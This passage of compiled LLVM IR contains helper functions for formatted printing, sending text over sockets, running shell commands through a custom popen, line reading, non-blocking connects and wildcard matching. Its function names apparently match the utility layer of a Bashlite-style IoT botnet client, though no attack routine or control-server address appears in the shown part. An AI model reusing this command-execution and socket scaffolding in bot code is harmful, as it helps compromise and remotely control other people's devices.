  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %62

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %60

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = and i32 %57, 65280
  %59 = ashr i32 %58, 8
  br label %60

; <label>:60:                                     ; preds = %53, %52
  %61 = phi i32 [ -1, %52 ], [ %59, %53 ]
  store i32 %61, i32* %2, align 4
  br label %62

; <label>:62:                                     ; preds = %60, %19
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !1
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #2
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4

; <label>:24:                                     ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
